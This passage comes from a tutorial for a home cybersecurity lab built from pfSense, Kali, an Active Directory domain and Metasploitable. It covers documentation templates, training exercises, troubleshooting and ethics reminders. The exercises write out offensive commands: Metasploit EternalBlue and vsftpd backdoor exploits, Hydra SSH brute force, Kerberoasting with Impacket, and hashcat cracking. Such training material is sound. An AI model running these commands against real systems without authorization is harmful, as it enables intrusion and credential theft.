nmap -sV -sC 192.168.1.10

# Scan for common vulnerabilities (against Metasploitable only!)
nmap -sV --script vulners 192.168.1.50
```

---

## Phase 5: Documentation Setup

### Step 5.1: Create Lab Documentation Structure

#### In Obsidian

Create the following notes:

1. **Lab Inventory**
   ```markdown
   # Lab Inventory
   
   ## Virtual Machines
   
   | VM Name | IP Address | Purpose | Credentials |
   |---------|------------|---------|-------------|
   | pfSense-Firewall | 192.168.56.2 | Firewall/Router | admin / [password] |
   | Kali-Linux | 192.168.56.10 | Pentesting | kali / [password] |
   | Windows-10-Client | 192.168.1.101 | Target/Client | labuser / [password] |
   | Windows-Server-DC | 192.168.1.10 | Domain Controller | Administrator / [password] |
   | Metasploitable2 | 192.168.1.50 | Vulnerable Target | msfadmin / msfadmin |
   
   ## Network Configuration
   
   - **WAN Network**: NAT (DHCP from host)
   - **LAN Network**: 192.168.1.0/24 (Internal)
   - **Host-Only Network**: 192.168.56.0/24
   
   ## Domain Information
   
   - **Domain**: labdomain.local
   - **NetBIOS**: LABDOMAIN
   - **Domain Controller**: DC01 (192.168.1.10)
   ```

2. **Tools Quick Reference**
   ```markdown
   # Tools Quick Reference
   
   ## Nmap
   
   ### Basic Scans
   ```bash
   # Ping scan
   nmap -sn 192.168.1.0/24
   
   # TCP SYN scan
   nmap -sS 192.168.1.10
   
   # Service version detection
   nmap -sV 192.168.1.10
   
   # OS detection
   nmap -O 192.168.1.10
   
   # Comprehensive scan
   nmap -sS -sV -O -sC 192.168.1.10
   ```
   
   ## Metasploit
   
   ### Basic Commands
   ```bash
   # Start msfconsole
   msfconsole
   
   # Search for exploits
   search type:exploit platform:windows
   
   # Use exploit
   use exploit/windows/smb/ms17_010_eternalblue
   
   # Show options
   show options
   
   # Set options
   set RHOSTS 192.168.1.101
   set LHOST 192.168.56.10
   
   # Run exploit
   exploit
   ```
   
   ## Wireshark
   
   ### Display Filters
   ```
   # HTTP traffic
   http
   
   # Specific IP
   ip.addr == 192.168.1.10
   
   # TCP traffic on port 80
   tcp.port == 80
   
   # Follow TCP stream
   Right-click packet → Follow → TCP Stream
   ```
   ```

3. **Lab Exercises Template**
   ```markdown
   # Exercise: [Name]
   
   **Date**: YYYY-MM-DD
   **Objective**: [What you're trying to achieve]
   **Target**: [Target system/service]
   
   ## Setup
   
   - [ ] Start required VMs
   - [ ] Verify network connectivity
   - [ ] Start required tools
   
   ## Steps
   
   1. [Step 1]
      ```bash
      # Commands
      ```
      
      **Result**: [What happened]
      
      **Screenshot**: ![[screenshot.png]]
   
   2. [Step 2]
      ...
   
   ## Findings
   
   - [Finding 1]
   - [Finding 2]
   
   ## Remediation
   
   - [How to fix finding 1]
   - [How to fix finding 2]
   
   ## Notes
   
   [Additional notes and observations]
   
   ## References
   
   - [Link 1]
   - [Link 2]
   ```

### Step 5.2: Create Network Diagram

Create a network diagram showing lab topology:

```
You can use:
- draw.io (https://app.diagrams.net/)
- Microsoft Visio
- Lucidchart

Save diagram in Obsidian vault: 02-Network Diagrams/Lab-Topology.png
```

---

## Phase 6: Testing and Validation

### Step 6.1: Basic Penetration Testing Exercises

#### Exercise 1: Network Discovery

**Objective**: Map the network and identify live hosts.

```bash
# From Kali Linux
# Discover hosts
nmap -sn 192.168.1.0/24 -oN discovery.txt

# Scan ports on discovered hosts
nmap -sV -sC 192.168.1.10,50,101 -oN portscan.txt

# Review results
cat discovery.txt
cat portscan.txt
```

#### Exercise 2: Vulnerability Scanning

**Objective**: Identify vulnerabilities using OpenVAS.

```bash
# From Kali Linux
# Start GVM
sudo gvm-start

# Access web interface: https://localhost:9392

# Create new target:
# - Name: Internal Network
# - Hosts: 192.168.1.0/24
# - Port List: All IANA assigned TCP and UDP

# Create new task:
# - Name: Full Network Scan
# - Scan Config: Full and fast
# - Target: Internal Network
# - Start scan

# Wait for completion (can take hours)
# Review results and export report
```

#### Exercise 3: Web Application Testing

**Objective**: Test web application with Burp Suite.

```bash
# Setup:
# 1. Configure browser proxy to 127.0.0.1:8080
# 2. Start Burp Suite
# 3. Navigate to http://192.168.1.50 (Metasploitable)

# In Burp:
# - Proxy tab → Intercept: On
# - Browse to target website
# - Modify requests in Burp
# - Forward or drop requests

# Spider the site:
# - Target tab → Right-click target → Spider this host

# Scan for vulnerabilities:
# - Target tab → Right-click target → Actively scan this host
```

#### Exercise 4: Password Attacks

**Objective**: Practice password cracking techniques.

```bash
# From Kali Linux
# Hydra - SSH brute force (against Metasploitable only!)
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh

# John the Ripper - Hash cracking
# First, extract hashes from target (if you have access)
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated cracking
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Exercise 5: Exploitation with Metasploit

**Objective**: Exploit vulnerable service on Metasploitable.

```bash
# From Kali Linux
msfconsole

# Search for Metasploitable vulnerabilities
search metasploitable

# Example: Exploit vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.50
show options
exploit

# If successful, you'll have a shell
# Try commands:
whoami
pwd
ls -la
```

### Step 6.2: Active Directory Testing

#### Exercise 6: AD Enumeration

**Objective**: Enumerate Active Directory structure.

```bash
# From Kali Linux
# Install enum4linux if not present
sudo apt install enum4linux -y

# Enumerate AD
enum4linux -a 192.168.1.10

# Using rpcclient
rpcclient -U "LABDOMAIN\jdoe" 192.168.1.10
# Commands:
enumdomusers
enumdomgroups
queryuser 0x451
exit

# Using PowerShell from Windows Client
# PowerView (download from GitHub)
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
```

#### Exercise 7: Kerberoasting

**Objective**: Extract service account credentials.

```bash
# From Kali Linux with Impacket
# Install impacket
pip3 install impacket

# Request service tickets
GetUserSPNs.py LABDOMAIN/jdoe:password -dc-ip 192.168.1.10 -request

# Crack tickets with hashcat
hashcat -m 13100 -a 0 tickets.txt /usr/share/wordlists/rockyou.txt
```

### Step 6.3: Network Traffic Analysis

#### Exercise 8: Packet Capture and Analysis

**Objective**: Capture and analyze network traffic.

```bash
# From Kali Linux
# Capture traffic
sudo tcpdump -i eth0 -w capture.pcap

# Or use Wireshark
sudo wireshark

# Select interface: eth0
# Start capture
# Generate traffic (browse websites, login to systems)
# Stop capture
# Analyze:
# - Statistics → Protocol Hierarchy
# - Statistics → Conversations
# - Analyze → Follow → TCP Stream
```

### Step 6.4: Documentation

After each exercise:

1. **Take Screenshots** (using Flameshot)
   ```bash
   # Capture key findings
   flameshot gui
   # Save to Obsidian vault
   ```

2. **Document in Obsidian**
   ```markdown
   - Create new note from template
   - Fill in steps, commands, results
   - Attach screenshots
   - Document findings
   - Note any issues or interesting observations
   ```

3. **Create Reports**
   ```markdown
   # Generate report in Obsidian
   # Export to PDF for sharing
   # Include:
   # - Executive Summary
   # - Methodology
   # - Findings
   # - Evidence (screenshots)
   # - Recommendations
   ```

---

## Appendix: Troubleshooting

### Common Issues

#### Issue: VM Won't Start - VT-x/AMD-V Error

**Solution**:
```
1. Restart computer
2. Enter BIOS/UEFI (usually Del, F2, or F12 during boot)
3. Navigate to CPU Configuration or Advanced Settings
4. Enable: Intel VT-x or AMD-V
5. Enable: Intel VT-d or AMD IOMMU (if available)
6. Save and exit
```

#### Issue: No Network Connectivity in VM

**Solution**:
```bash
# Check adapter status
ip link show

# Bring up interface
sudo ip link set eth0 up

# Request DHCP
sudo dhclient eth0

# Or set static IP
sudo nano /etc/network/interfaces

# Restart networking
sudo systemctl restart networking
```

#### Issue: pfSense Web Interface Inaccessible

**Solution**:
```
1. On pfSense console, select option 2 (Set interface IP)
2. Verify IP address is correct
3. From host, ping the IP address
4. Check firewall rules allow access
5. Try different browser
6. Clear browser cache
```

#### Issue: Windows Can't Join Domain

**Solution**:
```
1. Verify DNS settings point to Domain Controller
2. Verify connectivity: ping 192.168.1.10
3. Verify DNS resolution: nslookup labdomain.local
4. Check Domain Controller is running
5. Check firewall allows domain traffic
6. Ensure date/time is synchronized
```

#### Issue: Kali Tools Not Working

**Solution**:
```bash
# Update system
sudo apt update
sudo apt full-upgrade -y

# Fix broken packages
sudo apt install -f

# Reinstall specific tool
sudo apt reinstall [tool-name]

# Update tool databases
sudo updatedb
sudo msfdb init
```

#### Issue: VirtualBox Guest Additions Not Working

**Solution**:
```bash
# Linux guests
sudo apt install build-essential dkms linux-headers-$(uname -r)
sudo mount /dev/cdrom /mnt
cd /mnt
sudo ./VBoxLinuxAdditions.run
sudo reboot

# Windows guests
# Reinstall from ISO
# Devices → Insert Guest Additions CD image
# Run setup from CD drive
# Reboot
```

#### Issue: Low Performance

**Solutions**:
```
1. Increase VM RAM (if host has available)
2. Enable 3D acceleration (Display settings)
3. Increase video memory (Display settings)
4. Use SSD instead of HDD
5. Close unnecessary VMs
6. Disable unnecessary services in VMs
7. Use lightweight desktop environment (XFCE instead of GNOME)
```

### Performance Optimization

#### VirtualBox Settings

```
For each VM:
1. System → Motherboard:
   - Disable Floppy
   - Enable I/O APIC
   
2. System → Processor:
   - Assign multiple CPUs (if available)
   - Enable PAE/NX
   
3. Display:
   - Increase video memory
   - Enable 3D acceleration (if stable)
   
4. Storage:
   - Use SSD for VM files
   - Use VDI format, dynamically allocated
   - Enable host I/O cache
```

#### Host System Optimization

```
1. Close unnecessary applications
2. Disable antivirus scanning for VM directory (if safe)
3. Use wired connection instead of WiFi
4. Ensure adequate cooling (avoid throttling)
5. Consider RAM upgrade if running multiple VMs
```

### Backup and Snapshots

#### Create Snapshots

```
Before major changes:
1. Right-click VM → Snapshots
2. Click "Take" icon
3. Name: "Before [change description]"
4. Description: Date and purpose
5. Take snapshot

After successful configuration:
1. Take another snapshot
2. Name: "Working [feature name]"
```

#### Export VMs

```
For backup or sharing:
1. File → Export Appliance
2. Select VMs to export
3. Format: OVF 1.0 or 2.0
4. Choose destination
5. Export

To import:
1. File → Import Appliance
2. Select .ova file
3. Import
```

### Security Reminders

#### Lab Safety

```
⚠️ IMPORTANT:
1. This is an isolated lab environment
2. Never perform attacks on systems you don't own
3. Keep vulnerable VMs isolated (Internal Network only)
4. Don't expose Metasploitable to the internet
5. Use evaluation/trial licenses legally
6. Document all activities
7. Change default passwords (except on vulnerable VMs)
8. Snapshot VMs before risky operations
```

#### Legal and Ethical Considerations

```
✓ DO:
- Practice only in your own lab
- Use with permission on authorized targets
- Document everything for learning
- Follow responsible disclosure if finding real vulnerabilities
- Keep software updated (except vulnerable targets)

✗ DON'T:
- Attack systems without authorization
- Use learned techniques maliciously
- Share credentials or access
- Bypass security controls in production systems
- Engage in illegal activities
```

---

## Conclusion

Congratulations! You now have a fully functional cybersecurity home lab with:

- ✅ Network security (pfSense firewall)
- ✅ Penetration testing platform (Kali Linux)
- ✅ Windows environment (Active Directory)
- ✅ Vulnerable targets (Metasploitable)
- ✅ Complete tool suite (Nmap, Metasploit, Burp, etc.)
- ✅ Documentation system (Obsidian, VS Code)

### Next Steps

1. **Practice Regularly**: Use the lab frequently to maintain skills
2. **Follow Along with Training**: Use platforms like:
   - Hack The Box
   - TryHackMe
   - PentesterLab
   - SANS Cyber Aces
3. **Pursue Certifications**: Prepare for:
   - CEH (Certified Ethical Hacker)
   - OSCP (Offensive Security Certified Professional)
   - Security+
   - GPEN
4. **Stay Updated**: Keep tools and systems updated
5. **Join Community**: Participate in forums, Discord, Reddit
6. **Contribute**: Share findings and help others learn

### Additional Resources

**Learning Platforms:**
- TryHackMe: https://tryhackme.com
- Hack The Box: https://www.hackthebox.com
- OverTheWire: https://overthewire.org
- PentesterLab: https://pentesterlab.com

**Documentation:**
- Kali Linux Docs: https://www.kali.org/docs/
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

**Communities:**
- Reddit: r/netsec, r/AskNetsec, r/hacking
- Discord: NetSecFocus, The Many Hats Club
- Forums: Kali Linux Forums, Metasploit Community

---

**Document Version**: 1.0  
**Last Updated**: 2025-10-18  
**Author**: Certified Ethical Hacker Trainer  
**License**: MIT

---

**Disclaimer**: This guide is for educational purposes only. Always obtain proper authorization before testing any systems. Unauthorized access to computer systems is illegal.
